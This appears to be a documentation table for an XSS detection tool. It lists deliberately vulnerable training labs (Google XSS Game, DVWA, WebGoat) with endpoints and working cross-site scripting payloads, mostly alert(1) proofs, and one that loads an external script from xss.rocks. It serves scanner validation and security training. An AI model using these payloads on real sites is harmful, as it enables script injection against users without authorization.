Project: BRS-XSS (XSS Detection Suite)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: Thu 08 Jan 2026 17:25:59 UTC
Status: Created
Telegram: https://t.me/EasyProTech
 
# Known Validation Targets

| Platform | Level / Endpoint | Method | Example Request | Expected Result |
|----------|------------------|--------|-----------------|-----------------|
| Google XSS Game | Level 1 – `/level1/frame?query=PAYLOAD` | GET | `https://xss-game.appspot.com/level1/frame?query=<script>alert(1)</script>` | Reflected XSS in HTML (low) |
| Google XSS Game | Level 2 – `/level2/frame` | POST | `message=<img src=x onerror=alert(1)>` | Stored XSS in chat (low) |
| Google XSS Game | Level 3 – `/level3/frame#FRAGMENT` | GET | `#1' onerror='alert(1)'` | DOM XSS via fragment (medium) |
| Google XSS Game | Level 4 – `/level4/frame?timer=PAYLOAD` | GET | `timer=1');alert('1` | XSS in JS context (medium) |
| Google XSS Game | Level 5 – `/level5/frame/signup?next=PAYLOAD` | GET | `next=javascript:alert(1)` | Bypass via `javascript:` (medium) |
| Google XSS Game | Level 6 – `/level6/frame#PAYLOAD` | GET | `#//xss.rocks/xss.js` | External script (high) |
| DVWA | `/vulnerabilities/xss_r/` (low/med/high) | GET | `name=<script>alert(1)</script>` and variations | Reflected XSS (HTML) |
| DVWA | `/vulnerabilities/xss_s/` (low/med) | POST | `txtName=<script>alert(1)</script>` | Stored XSS (Guestbook) |
| DVWA | `/vulnerabilities/xss_d/` (low/med) | GET | `default=<svg/onload=alert(1)>` | DOM XSS (HTML/JS) |
| WebGoat | `/CrossSiteScripting/attack5a` | POST | `field1=<script>alert(1)</script>` | Reflected XSS |
| WebGoat | `/CrossSiteScripting/attack6a` | GET | `route=test<script>alert(1)</script>` | DOM XSS (medium) |
| WebGoat | `/CrossSiteScripting/attack7` | POST | `comment=<script>alert(1)</script>` | Stored XSS |
| WebGoat | `/CrossSiteScripting/attack8` | GET | `input=<script>alert(1)</script>` | CSP/JS XSS (high) |
| Benchmarks | `performance-test.py` list | mix | see file | Used for automated speed/quality comparison |

> Note: All targets assume authorized testing. Before scanning, ensure you have permission and safe mode settings configured.
